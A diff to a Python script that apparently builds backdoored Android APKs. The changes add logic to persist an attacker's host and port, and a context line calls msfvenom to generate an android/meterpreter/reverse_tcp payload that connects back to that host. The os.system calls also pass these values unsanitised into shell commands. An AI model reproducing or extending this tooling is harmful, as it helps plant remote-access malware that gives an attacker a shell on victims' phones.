@@ -104,6 +104,16 @@ def inject():
  
 def embed():
     global dirmsf,host,port
+    if os.path.isfile("host"):
+        host = open("host").readline().strip()
+        pass
+    else:
+        pass
+    if os.path.isfile("port"):
+        port = open("port").readline().strip()
+        pass
+    else:
+        pass
     if os.path.isdir("payload"):
         ask = str(input(b+"[+]"+w+" do you want to use the previous payload? (y/n) "))
         if ask == "y" or ask == "Y":
@@ -157,6 +167,9 @@ def embed():
         else:
             pass
         print(b+"[+]"+w+" generate metasploit payload using msfvenom")
+        os.system("echo '"+str(host)+"' > host;echo '"+str(port)+"' > port")
+        host = open("host").readline().strip()
+        port = open("port").readline().strip()
         os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(host)+" lport="+str(port)+" --platform android -a dalvik -o payload.apk &> /dev//null")
         if os.path.isfile("payload.apk"):
             pass
